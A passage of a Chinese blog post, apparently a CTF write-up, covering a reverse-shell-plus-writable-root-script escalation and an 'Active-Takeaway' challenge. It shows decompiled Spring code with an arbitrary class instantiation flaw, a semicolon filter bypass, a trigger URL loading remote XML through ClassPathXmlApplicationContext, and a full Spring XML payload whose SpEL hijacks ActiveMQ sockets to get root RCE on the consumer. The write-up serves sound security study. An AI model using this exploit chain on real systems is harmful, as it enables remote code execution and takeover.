<p>上传文件的内容也很简单，就设置一个模板语法反弹个shell，之后靶机有个clear.sh，是root权限运行的，我们修改一下文件内容，就可以提权得到flag<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1706166540209-eae331f7-6670-469b-a1d0-30be92c36b20.png#averageHue=%2332363f&clientId=uf4870c6d-3213-4&from=paste&height=149&id=u4a9e774c&originHeight=186&originWidth=1256&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=7971&status=done&style=none&taskId=uf59475a7-0bac-470e-bfc1-dc55533e027&title=&width=1004.8" alt="d6f6463095abb051fb099c5adf02dba4.png"></p>
<h1 id="Active-Takeaway"><a href="#Active-Takeaway" class="headerlink" title="Active-Takeaway"></a>Active-Takeaway</h1><p>考点：ActiveMQ打consumer<br>参考文章：<a target="_blank" rel="noopener" href="https://www.yulegeyu.com/">https://www.yulegeyu.com/</a><br>不知道为啥没搜到这文章，我科学上网出问题了怎么办<br>漏洞点很简单</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Source code recreated from a .class file by IntelliJ IDEA</span></span><br><span class="line"><span class="comment">// (powered by FernFlower decompiler)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.example.customer.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.example.customer.entity.OrderEntity;</span><br><span class="line"><span class="keyword">import</span> com.example.customer.service.FoodService;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> javax.annotation.Resource;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PathVariable;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&#123;&quot;/api&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OrderController</span> &#123;</span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> FoodService foodService;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">OrderController</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&#123;&quot;/listorders&quot;&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;OrderEntity&gt; <span class="title function_">listOrders</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.foodService.listOrders();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&#123;&quot;/makeorder&quot;&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> Long <span class="title function_">makeOrder</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.foodService.order();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&#123;&quot;/take/&#123;id&#125;&quot;&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> Long <span class="title function_">take</span><span class="params">(<span class="meta">@PathVariable</span> Long id)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.foodService.take(id);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&#123;&quot;/orderstatus/&#123;id&#125;&quot;&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> OrderEntity <span class="title function_">orderStatus</span><span class="params">(<span class="meta">@PathVariable</span> Long id)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.foodService.orderStatus(id);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&#123;&quot;/changefood&quot;&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">change</span><span class="params">(<span class="meta">@RequestParam</span> String foodServiceClassName, <span class="meta">@RequestParam</span> String name)</span> <span class="keyword">throws</span> ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchMethodException &#123;</span><br><span class="line">        Class foodServiceClass;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            foodServiceClass = Class.forName(foodServiceClassName);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException var5) &#123;</span><br><span class="line">            foodServiceClass = Class.forName(<span class="string">&quot;com.example.customer.service.IronBeefNoodleService&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">this</span>.foodService = (FoodService)foodServiceClass.getDeclaredConstructor(String.class).newInstance(name);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Changed to &quot;</span> + foodServiceClassName + <span class="string">&quot; with name &quot;</span> + name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>changefood有个任意类实例化的点位，但是需要绕过一下filter</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Source code recreated from a .class file by IntelliJ IDEA</span></span><br><span class="line"><span class="comment">// (powered by FernFlower decompiler)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.example.customer.filter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.Filter;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.FilterChain;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.FilterConfig;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletResponse;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebFilter;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebFilter(</span></span><br><span class="line"><span class="meta">    filterName = &quot;customerFilter&quot;,</span></span><br><span class="line"><span class="meta">    urlPatterns = &#123;&quot;/api/*&quot;&#125;</span></span><br><span class="line"><span class="meta">)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CustomerFilter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">CustomerFilter</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">        <span class="built_in">super</span>.init(filterConfig);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">uri</span> <span class="operator">=</span> ((HttpServletRequest)request).getRequestURI().replaceAll(<span class="string">&quot;/api&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">endpoint</span> <span class="operator">=</span> uri.replaceAll(<span class="string">&quot;/&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (endpoint.equalsIgnoreCase(<span class="string">&quot;changefood&quot;</span>)) &#123;</span><br><span class="line">            response.getWriter().write(<span class="string">&quot;Under construction...&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            chain.doFilter(request, response);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.destroy();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>我们最终触发的url是<code>xxx/api/changefood;?foodServiceClassName=org.springframework.context.support.ClassPathXmlApplicationContext&amp;name=http://xxxxx</code><br>POC长这个样子</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:context</span>=<span class="string">&quot;http://www.springframework.org/schema/context&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-4.0.xsd</span></span></span><br><span class="line"><span class="string"><span class="tag">            http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context-4.0.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:property-placeholder</span> <span class="attr">ignore-resource-not-found</span>=<span class="string">&quot;false&quot;</span> <span class="attr">ignore-unresolvable</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.String&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;String&quot;</span> <span class="attr">value</span>=<span class="string">&quot;#&#123;T(javax.script.ScriptEngineManager).newInstance().getEngineByName(&#x27;js&#x27;).eval(<span class="symbol">&amp;quot;</span>function getunsafe() &#123;var unsafe = java.lang.Class.forName(&#x27;sun.misc.Unsafe&#x27;).getDeclaredField(&#x27;theUnsafe&#x27;);unsafe.setAccessible(true);return unsafe.get(null);&#125; var unsafe = getunsafe(); brokerRegistry = org.apache.activemq.broker.BrokerRegistry.getInstance();brokers = brokerRegistry.getBrokers();for(key in brokers)&#123;   brokerService = brokers.get(key);  try&#123; f = brokerService.getClass().getDeclaredField(&#x27;shutdownHook&#x27;); &#125;catch(e)&#123;f = brokerService.getClass().getSuperclass().getDeclaredField(&#x27;shutdownHook&#x27;);&#125;   f.setAccessible(true);   shutdownHook = f.get(brokerService);   threadGroup = shutdownHook.getThreadGroup();   f = threadGroup.getClass().getDeclaredField(&#x27;threads&#x27;); threads = unsafe.getObject(threadGroup, unsafe.objectFieldOffset(f)); for(key in threads)&#123;       thread = threads[key];       if(thread == null)&#123;           continue;       &#125;       threadName = thread.getName();       if(threadName.startsWith(&#x27;ActiveMQ Transport: &#x27;))&#123;           f = thread.getClass().getDeclaredField(&#x27;target&#x27;);                      tcpTransport = unsafe.getObject(thread, unsafe.objectFieldOffset(f));           f = tcpTransport.getClass().getDeclaredField(&#x27;socket&#x27;);           f.setAccessible(true);           socket = f.get(tcpTransport);           bos = new java.io.ByteArrayOutputStream();           dataOutput = new java.io.DataOutputStream(bos);           dataOutput.writeInt(1);           dataOutput.writeByte(31);    bs = new org.apache.activemq.openwire.BooleanStream();    bs.writeBoolean(true);  bs.writeBoolean(true);  bs.writeBoolean(true);  bs.writeBoolean(false);   bs.writeBoolean(true); bs.writeBoolean(false);  bs.marshal(dataOutput); dataOutput.writeUTF(&#x27;bb&#x27;);  dataOutput.writeUTF(&#x27;aa&#x27;);  dataOutput.writeUTF(&#x27;org.springframework.context.support.ClassPathXmlApplicationContext&#x27;);  dataOutput.writeUTF(&#x27;http://localhost:8000/dddd&#x27;);  dataOutput.writeShort(0);  socketOutputStream = socket.getOutputStream();           socketOutputStream.write(bos.toByteArray());         &#125;   &#125;   &#125;<span class="symbol">&amp;quot;</span>)&#125;&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>这个先让外层的broker执行这段代码，然后这段代码中SPEL部分会劫持consumer和server的交互信息，从而让consumer也受到攻击从而RCE获取root权限。</p>

    </div>

    
    <div class="about">
        <h1>About this Post</h1>
        <div class="details">
            <p>This post is written by Boogipop, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
        </div>
        
        <p class="tags">
            
            <i class="icon"></i>
            <a href="/tags/WriteUp/" class="tag">#WriteUp</a>
        </p>
        
    </div>
    

    <div class="container post-prev-next">
        
        <a href="/2024/02/12/%E7%AC%AC%E4%B8%83%E5%B1%8A%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91Writeup/" class="next">
            <div>
                <div class="text">
                    <p class="label">Next</p>
                    <h3 class="title">第七届 杭州西湖论剑网络安全大赛 Writeup</h3>
                </div>
            </div>
        </a>
        
        
        <a href="/2024/02/07/%E3%80%90.NET%20%E5%AE%89%E5%85%A8%E3%80%91ASP.NET%20BinaryFormatter%20Deserialization%2003/" class="prev">
            <div>
                <div class="text">
                    <p class="label">Previous</p>
                    <h3 class="title">【.NET 安全】ASP.NET BinaryFormatter Deserialization 03</>
                </div>
            </div>
        </a>
        
    </div>

    
        
        
        <script src="https://giscus.app/client.js" data-repo="Boogipop/Boogipop.github.io" data-repo-id="R_kgDOIFi78g" data-category="Announcements" data-category-id="DIC_kwDOIFi78s4Cav9f" data-mapping="pathname" data-strict="1" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>
        
    
</article>

        <footer>
    <div class="inner">
        <div class="links">
            
            <div class="group">
                <h2 class="title">Blog</h2>
                
                <a href="/" class="item">Blog</a>
                
                <a href="/archives" class="item">Archives</a>
                
                <a href="/tags" class="item">Tags</a>
                
                <a href="/categories" class="item">Categories</a>
                
                <a href="/search" class="item">Search</a>
                
                <a href="/friends" class="item">Friends</a>
                
                <a href="/about" class="item">About</a>
                
                <a href="/atom.xml" class="item">RSS</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Projects</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Me</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
                
                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
                
                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
                
                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
                
                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
                
                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
                
            </div>
            
        </div>
        <span>&copy; 2025 Boogipop<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
        
        
            <br>
            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
                <label>
                    <input type="radio" value="light">
                    <span>Light</span>
                </label>
                <label>
                    <input type="radio" value="dark">
                    <span>Dark</span>
                </label>
                <label>
                    <input type="radio" value="auto">
                    <span>Auto</span>
                </label>
            </div>
        
    </div>
</footer>


        
<script src="/js/main.js"></script>

        
        
        

        
        <script src="https://unpkg.com/scrollreveal"></script>
		
        <script>
            window.addEventListener('load', () => {
                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
                ScrollReveal().reveal('.post-list-item .cover-img img')
                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
            })
        </script>
        
    </body>
</html>